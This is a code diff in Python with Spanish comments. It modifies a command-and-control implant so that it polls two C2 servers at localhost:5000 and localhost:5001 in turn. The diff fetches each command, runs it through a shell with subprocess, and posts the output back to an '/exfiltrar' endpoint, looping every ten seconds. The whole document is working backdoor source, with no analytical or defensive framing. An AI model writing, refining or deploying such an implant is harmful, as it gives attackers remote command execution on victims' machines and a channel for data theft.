@@ -1,31 +1,36 @@
 import requests
-import threading
 import subprocess
+import time
 
-def manejar_servidor(url_servidor):
-    while True:
-        try:
-            # Obtener comando del servidor C2
-            respuesta = requests.get(f"{url_servidor}/comando")
-            comando = respuesta.text
+# Direcciones de los servidores C2
+url_primero_c2 = "http://localhost:5000"
+url_segundo_c2 = "http://localhost:5001"
 
-            if comando.lower() == "exit":
-                break
+def ejecutar_y_enviar_resultado(url_servidor):
+    respuesta = requests.get(f"{url_servidor}/comando")
+    comando = respuesta.text
 
-            # Ejecutar el comando del sistema y capturar salida
-            resultado_comando = subprocess.run(comando, shell=True, capture_output=True, text=True)
-            datos_a_exfiltrar = resultado_comando.stdout + resultado_comando.stderr
+    if comando.lower() == "exit":
+        return True
 
-            # Exfiltrar los datos al servidor C2
-            requests.post(f"{url_servidor}/exfiltrar", data=datos_a_exfiltrar.encode('utf-8'))
+    resultado_comando = subprocess.run(comando, shell=True, capture_output=True, text=True)
+    datos_a_exfiltrar = resultado_comando.stdout + resultado_comando.stderr
 
-        except Exception as e:
-            print(f"Error en la conexión con {url_servidor}: {e}")
+    requests.post(f"{url_servidor}/exfiltrar", data=datos_a_exfiltrar.encode('utf-8'))
+    return False
+
+while True:
+    try:
+        # Comunicarse con el primer servidor C2 y procesar comandos
+        if ejecutar_y_enviar_resultado(url_primero_c2):
+            break
+        
+        # Comunicarse con el segundo servidor C2 y procesar comandos
+        if ejecutar_y_enviar_resultado(url_segundo_c2):
             break
 
-url_primario = "http://localhost:5000"
-url_secundario = requests.get(f"{url_primario}/servidor_secundario").text
-
-# Iniciar hilos para manejar comunicación con ambos servidores C2
-threading.Thread(target=manejar_servidor, args=(url_primario,)).start()
-threading.Thread(target=manejar_servidor, args=(url_secundario,)).start()
+        # Esperar antes de consultar nuevamente
+        time.sleep(10)
+    except Exception as e:
+        print(f"Error: {e}")
+        time.sleep(10)
